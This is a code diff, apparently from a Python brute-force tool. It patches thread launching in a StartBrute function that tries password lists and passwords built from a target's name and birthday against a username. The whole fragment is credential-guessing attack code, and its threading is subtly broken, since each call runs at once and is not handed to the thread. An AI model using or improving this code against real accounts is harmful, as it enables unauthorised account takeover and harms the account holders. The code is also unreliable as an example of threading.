@@ -355,12 +355,12 @@ def StartBrute():
         if answers[0] == 1:
             for password in basic_passwords:
                 lock.acquire()
-                Thread(target=Brute(answers,username,password,firstname=firstname,lastname=lastname,birthday=birthday))
+                Thread(target=Brute(answers,username,password,firstname=firstname,lastname=lastname,birthday=birthday)).start()
                 lock.release()
         elif (answers[0] == 0 and answers[1] == 1 or answers[2] == 1 or answers[3] == 1 or answers[4] == 1) and (answers[5] == 0):
             for password in passwords:
                 lock.acquire()
-                Thread(target=Brute(answers,username,password,firstname=firstname,lastname=lastname,birthday=birthday))
+                Thread(target=Brute(answers,username,password,firstname=firstname,lastname=lastname,birthday=birthday)).start()
                 lock.release()
 
         if (answers[0] == 0) and (answers[1] == 0) and (answers[2] == 0) and (answers[3] == 0) and (answers[4] == 0) and (answers[5] == 1):
@@ -374,13 +374,13 @@ def StartBrute():
                 while True:
                     password = GenerateSpecificCredential(username,guessed_password,firstname,lastname,GetRandomBirthdayNum(birthday))
                     lock.acquire()
-                    Thread(target=StartBruteSpecificInfo(username,password))
+                    Thread(target=StartBruteSpecificInfo(username,password)).start()
                     lock.release()
             else:
                 while True:
                     password = GenerateSpecificCredential(username,guessed_password,firstname,lastname,birthday)
                     lock.acquire()
-                    Thread(target=StartBruteSpecificInfo(username,password))
+                    Thread(target=StartBruteSpecificInfo(username,password)).start()
                     lock.release()
     else:
         PrintText('WHITELIST','You can not check this user',Fore.RED,Fore.WHITE)
